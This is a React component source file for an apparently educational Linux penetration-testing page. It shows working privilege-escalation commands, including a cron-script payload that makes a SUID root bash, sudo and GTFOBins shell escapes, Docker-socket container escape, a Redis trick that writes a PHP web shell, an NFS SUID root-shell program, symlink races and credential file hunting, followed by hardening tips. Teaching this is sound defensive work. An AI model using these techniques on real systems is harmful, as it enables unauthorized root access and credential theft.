
import React from 'react';
import { Terminal, Shield, Bug } from 'lucide-react';
import CodeExample from '@/components/CodeExample';
import SecurityCard from '@/components/SecurityCard';
import { 
  Accordion, 
  AccordionContent, 
  AccordionItem, 
  AccordionTrigger 
} from '@/components/ui/accordion';

const LinuxSection: React.FC = () => {
  return (
    <section className="space-y-12">
      <div className="mb-8">
        <h2 className="text-3xl font-bold mb-6 flex items-center gap-2">
          <Terminal className="text-cybr-primary" />
          Linux Penetration Testing
        </h2>
        <p className="mb-4">
          Linux systems form the backbone of most server infrastructure and require specialized penetration testing approaches.
          Understanding Linux security models and common misconfigurations is essential for comprehensive security assessments.
        </p>
      </div>
      
      <div className="card mb-10">
        <h3 className="text-2xl font-bold mb-6">Key Areas to Focus</h3>
        
        <Accordion type="single" collapsible className="w-full">
          <AccordionItem value="priv-esc">
            <AccordionTrigger className="text-lg font-semibold py-4 hover:bg-gray-50 dark:hover:bg-gray-800 px-4 rounded-lg">
              <div className="flex items-center gap-2">
                <Bug className="text-cybr-primary h-5 w-5" />
                Privilege Escalation Vectors
              </div>
            </AccordionTrigger>
            <AccordionContent className="px-4 pt-2">
              <p className="mb-4">
                Linux privilege escalation allows attackers to gain higher privileges from a limited user account.
                These techniques exploit misconfigurations and vulnerabilities in the Linux operating system.
              </p>
              
              <div className="space-y-4 mb-4">
                <h4 className="text-md font-semibold">Key Vectors:</h4>
                <ul className="list-disc pl-6 space-y-2">
                  <li>
                    <span className="font-semibold">SUID/SGID Binaries</span>: Executables that run with the permissions of the owner/group regardless of who executes them.
                  </li>
                  <li>
                    <span className="font-semibold">Sudo Misconfigurations</span>: Excessive sudo privileges that allow users to run commands as root.
                  </li>
                  <li>
                    <span className="font-semibold">Cron Jobs</span>: Scheduled tasks that might run with elevated privileges and have weak permissions.
                  </li>
                  <li>
                    <span className="font-semibold">Kernel Exploits</span>: Vulnerabilities in the Linux kernel that allow privilege escalation.
                  </li>
                  <li>
                    <span className="font-semibold">Weak File Permissions</span>: Critical files with permissions that allow modification by unprivileged users.
                  </li>
                </ul>
              </div>
              
              <CodeExample
                language="bash"
                title="Finding SUID Binaries"
                code={`# Find all SUID binaries
find / -type f -perm -u=s 2>/dev/null

# Find all SGID binaries
find / -type f -perm -g=s 2>/dev/null

# Find files with capabilities
getcap -r / 2>/dev/null`}
              />
              
              <CodeExample
                language="bash"
                title="Exploiting Weak Cron Job Permissions"
                code={`# Find writable cron jobs
ls -la /etc/cron*
find /etc/cron* -type f -writable 2>/dev/null

# Check for scripts run by cron that might be writable
grep -r "/home/" /etc/cron* /var/spool/cron/ 2>/dev/null

# If a script is writable, add malicious code:
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > /home/user/backup.sh

# Wait for cron to run, then execute:
/tmp/rootbash -p    # -p preserves privileges`}
                isVulnerable={true}
              />
              
              <CodeExample
                language="bash"
                title="Sudo Privilege Enumeration"
                code={`# Check what commands a user can run with sudo
sudo -l

# Example output:
# User user may run the following commands on host:
#   (ALL) NOPASSWD: /usr/bin/find

# If allowed to run 'find' with sudo, you can escalate:
sudo find /etc -exec /bin/sh \\;

# If allowed to run a scripting language (python, perl, etc):
sudo python -c 'import os; os.system("/bin/bash")'`}
                isVulnerable={true}
              />
            </AccordionContent>
          </AccordionItem>
          
          <AccordionItem value="service-vulns">
            <AccordionTrigger className="text-lg font-semibold py-4 hover:bg-gray-50 dark:hover:bg-gray-800 px-4 rounded-lg">
              <div className="flex items-center gap-2">
                <Bug className="text-cybr-primary h-5 w-5" />
                Service Vulnerabilities
              </div>
            </AccordionTrigger>
            <AccordionContent className="px-4 pt-2">
              <p className="mb-4">
                Linux services often introduce vulnerabilities through misconfigurations and outdated software. 
                Penetration testers target these services for initial access and privilege escalation.
              </p>
              
              <div className="space-y-4 mb-4">
                <h4 className="text-md font-semibold">Common Vulnerable Services:</h4>
                <ul className="list-disc pl-6 space-y-2">
                  <li>
                    <span className="font-semibold">SSH Misconfiguration</span>: Weak authentication settings, allowed legacy protocols, or exposed keys.
                  </li>
                  <li>
                    <span className="font-semibold">Web Servers</span>: Apache or Nginx with vulnerable configurations or outdated modules.
                  </li>
                  <li>
                    <span className="font-semibold">Database Services</span>: Insecure default configurations in MySQL, PostgreSQL, or MongoDB.
                  </li>
                  <li>
                    <span className="font-semibold">Containerization Issues</span>: Docker or LXC misconfigurations that allow container escape.
                  </li>
                  <li>
                    <span className="font-semibold">Legacy Services</span>: Outdated and unmaintained services with known vulnerabilities.
                  </li>
                </ul>
              </div>
              
              <CodeExample
                language="bash"
                title="SSH Configuration Audit"
                code={`# Check SSH configuration for security issues
grep -i "PasswordAuthentication\\|PermitRootLogin\\|PermitEmptyPasswords\\|X11Forwarding" /etc/ssh/sshd_config

# Checking for SSH keys with weak permissions
find / -name "id_rsa" 2>/dev/null
ls -la ~/.ssh/

# Checking for authorized_keys files and their permissions
find / -name "authorized_keys" 2>/dev/null
ls -la ~/.ssh/authorized_keys`}
              />
              
              <CodeExample
                language="bash"
                title="Container Escape Techniques"
                code={`# Check if running in a Docker container
grep docker /proc/self/cgroup

# Mount host filesystem if privileged container
mkdir -p /mnt/host-fs
mount /dev/sda1 /mnt/host-fs

# Docker socket access (if available)
docker -H unix:///var/run/docker.sock ps
docker -H unix:///var/run/docker.sock exec -it containerid /bin/bash

# Create privileged container with host mount
docker run -v /:/host -it ubuntu chroot /host bash`}
                isVulnerable={true}
              />
              
              <CodeExample
                language="bash"
                title="Database Security Testing"
                code={`# Check for MySQL servers with no password
mysql -u root

# Check PostgreSQL trust authentication
psql -h localhost -U postgres

# Find MongoDB instances with no auth
mongo --host 127.0.0.1

# Redis unauthorized access
redis-cli -h target
> CONFIG GET *
> CONFIG SET dir /var/www/html
> CONFIG SET dbfilename shell.php
> SET test "<?php system($_GET['cmd']); ?>"
> SAVE`}
                isVulnerable={true}
              />
            </AccordionContent>
          </AccordionItem>
          
          <AccordionItem value="file-system">
            <AccordionTrigger className="text-lg font-semibold py-4 hover:bg-gray-50 dark:hover:bg-gray-800 px-4 rounded-lg">
              <div className="flex items-center gap-2">
                <Bug className="text-cybr-primary h-5 w-5" />
                File System Security
              </div>
            </AccordionTrigger>
            <AccordionContent className="px-4 pt-2">
              <p className="mb-4">
                Linux file systems use a permission model that, when misconfigured, can lead to security vulnerabilities.
                Penetration testers look for permission issues that allow unauthorized access to sensitive files.
              </p>
              
              <div className="space-y-4 mb-4">
                <h4 className="text-md font-semibold">Key Vulnerabilities:</h4>
                <ul className="list-disc pl-6 space-y-2">
                  <li>
                    <span className="font-semibold">Permission Models</span>: Excessive permissions on critical files and directories.
                  </li>
                  <li>
                    <span className="font-semibold">Symbolic Links</span>: Insecurely configured symlinks that reference sensitive files.
                  </li>
                  <li>
                    <span className="font-semibold">Hard Links</span>: Hard links to privileged files that may bypass security controls.
                  </li>
                  <li>
                    <span className="font-semibold">Sensitive File Disclosure</span>: Accessible configuration files containing credentials.
                  </li>
                  <li>
                    <span className="font-semibold">Temporary File Handling</span>: Insecure creation and management of temporary files.
                  </li>
                </ul>
              </div>
              
              <CodeExample
                language="bash"
                title="Finding World-Writable Files"
                code={`# Find world-writable files
find / -type f -perm -o+w -not -path "/proc/*" 2>/dev/null

# Find world-writable directories
find / -type d -perm -o+w -not -path "/proc/*" 2>/dev/null

# Find files owned by specific user
find / -user targetuser -type f 2>/dev/null`}
              />
              
              <CodeExample
                language="bash"
                title="Exploiting Symlink Vulnerabilities"
                code={`# Create a symlink to a sensitive file
ln -s /etc/shadow /var/www/html/tmp/myfile

# If a process with higher privileges accesses this symlink
# and writes to it, it might modify the shadow file

# Creating time-of-check-time-of-use race condition
while true; do
  ln -sf /tmp/harmless.txt /home/user/file.txt
  ln -sf /etc/passwd /home/user/file.txt
done

# In another window, if a privileged process keeps checking and
# using /home/user/file.txt, it might eventually access /etc/passwd`}
                isVulnerable={true}
              />
              
              <CodeExample
                language="bash"
                title="Finding Credentials in Files"
                code={`# Search for password strings in files
grep -r "password" /etc/ 2>/dev/null
grep -r "PASSWORD" /etc/ 2>/dev/null

# Look for config files with credentials
find / -name "*.conf" -o -name "*.config" -o -name "*.ini" 2>/dev/null | xargs grep -l "password"

# Common files with credentials
cat /var/www/html/wp-config.php 2>/dev/null
cat /var/www/html/config.php 2>/dev/null
cat ~/.bash_history 2>/dev/null
cat ~/.mysql_history 2>/dev/null

# Check for .env files in web directories
find /var/www -name ".env" 2>/dev/null`}
              />
            </AccordionContent>
          </AccordionItem>
          
          <AccordionItem value="network-services">
            <AccordionTrigger className="text-lg font-semibold py-4 hover:bg-gray-50 dark:hover:bg-gray-800 px-4 rounded-lg">
              <div className="flex items-center gap-2">
                <Bug className="text-cybr-primary h-5 w-5" />
                Network Services
              </div>
            </AccordionTrigger>
            <AccordionContent className="px-4 pt-2">
              <p className="mb-4">
                Linux systems often run various network services that can be exploited if not properly secured.
                Penetration testers target these network interfaces for initial foothold or lateral movement.
              </p>
              
              <div className="space-y-4 mb-4">
                <h4 className="text-md font-semibold">Key Network Vulnerabilities:</h4>
                <ul className="list-disc pl-6 space-y-2">
                  <li>
                    <span className="font-semibold">Open Ports</span>: Unnecessary services listening on network interfaces.
                  </li>
                  <li>
                    <span className="font-semibold">Firewall Configurations</span>: Inadequate firewall rules allowing unauthorized access.
                  </li>
                  <li>
                    <span className="font-semibold">Network Interfaces</span>: Misconfigured network interfaces with improper access controls.
                  </li>
                  <li>
                    <span className="font-semibold">NFS/SMB Shares</span>: Insecurely configured file sharing services.
                  </li>
                  <li>
                    <span className="font-semibold">Service Discovery</span>: Internal services that reveal sensitive information.
                  </li>
                </ul>
              </div>
              
              <CodeExample
                language="bash"
                title="Network Service Enumeration"
                code={`# Check listening ports
netstat -tuln
ss -tuln

# List all active connections
netstat -tupan
ss -tupan

# Check firewall rules
iptables -L
firewall-cmd --list-all

# Check network interfaces
ip addr
ifconfig -a`}
              />
              
              <CodeExample
                language="bash"
                title="NFS Share Exploitation"
                code={`# List NFS shares
showmount -e target-ip

# Mount an NFS share
mkdir -p /tmp/mount
mount -t nfs target-ip:/share /tmp/mount

# Check for no_root_squash (allows root access)
cat /etc/exports    # On the server

# If no_root_squash is set, you can create SUID binaries:
cat << EOF > /tmp/mount/root_shell.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
int main() {
  setuid(0);
  setgid(0);
  system("/bin/bash");
  return 0;
}
EOF

gcc /tmp/mount/root_shell.c -o /tmp/mount/root_shell
chmod u+s /tmp/mount/root_shell

# When executed on the target, this gives you root access
/path/to/share/root_shell`}
                isVulnerable={true}
              />
              
              <CodeExample
                language="bash"
                title="Securing Network Services"
                code={`# Restrict SSH to specific IP addresses in /etc/ssh/sshd_config:
ListenAddress 192.168.1.100
AllowUsers user@192.168.1.*

# Properly configure NFS in /etc/exports:
/shared 192.168.1.0/24(ro,nosuid,noexec,root_squash)

# Configure proper firewall rules:
iptables -A INPUT -p tcp --dport 22 -s 192.168.1.0/24 -j ACCEPT
iptables -A INPUT -p tcp --dport 22 -j DROP

# Disable unnecessary services
systemctl disable rpcbind
systemctl stop rpcbind

# Check for and remove any .rhosts files
find / -name .rhosts 2>/dev/null | xargs rm -f`}
                isVulnerable={false}
              />
            </AccordionContent>
          </AccordionItem>
        </Accordion>
      </div>
      
      <div className="mb-10">
        <h3 className="text-2xl font-bold mb-6">Linux Penetration Testing Techniques</h3>
        
        <div className="space-y-6">
          <SecurityCard
            title="LinPEAS"
            description="Script for searching common Linux privilege escalation vectors, automating many checks that would otherwise be performed manually."
            icon={<Terminal className="h-6 w-6" />}
            severity="medium"
          />
          
          <div className="card">
            <h4 className="text-xl font-semibold mb-3 flex items-center gap-2">
              <Terminal className="text-cybr-primary h-5 w-5" />
              Common Linux Enumeration Commands
            </h4>
            <p className="mb-3">
              Basic commands for initial system enumeration:
            </p>
            
            <CodeExample
              language="bash"
              code={`# System information
uname -a
cat /etc/os-release
hostname
whoami
id

# Network information
ifconfig -a || ip a
netstat -tuln || ss -tuln
cat /etc/hosts

# Find SUID binaries
find / -type f -perm -u=s 2>/dev/null

# List cron jobs
ls -la /etc/cron*
cat /etc/crontab

# Check sudo permissions
sudo -l`}
              title="Basic Linux Enumeration"
            />
          </div>
          
          <div className="card">
            <h4 className="text-xl font-semibold mb-3 flex items-center gap-2">
              <Terminal className="text-cybr-primary h-5 w-5" />
              GTFOBins Techniques
            </h4>
            <p className="mb-3">GTFOBins is a curated list of Unix binaries that can be used to bypass local security restrictions:</p>
            
            <CodeExample
              language="bash"
              code={`# Example: Using find for privilege escalation
find . -exec /bin/sh -p \\; -quit

# Example: Using vim for privilege escalation
vim -c ':!/bin/sh'

# Example: Using python for privilege escalation
python -c 'import os; os.system("/bin/sh")'`}
              title="GTFOBins Examples"
              isVulnerable={true}
            />
          </div>
        </div>
      </div>
      
      <div className="card">
        <h3 className="text-2xl font-bold mb-4">Defensive Measures</h3>
        <div className="space-y-4">
          <div>
            <h4 className="text-lg font-semibold">Securing Linux Systems</h4>
            <CodeExample
              language="bash"
              code={`# Restrict SUID/SGID binaries
chmod u-s /usr/bin/vulnerable_binary

# Configure sudoers properly
visudo # Edit with caution

# Set up AppArmor profiles
aa-enforce /etc/apparmor.d/usr.sbin.service

# Enable auditd for logging
systemctl enable auditd
systemctl start auditd

# Configure SSH properly
# Edit /etc/ssh/sshd_config
# PermitRootLogin no
# PasswordAuthentication no
# X11Forwarding no`}
              title="Linux Hardening Best Practices"
              isVulnerable={false}
            />
          </div>
        </div>
      </div>
    </section>
  );
};

export default LinuxSection;
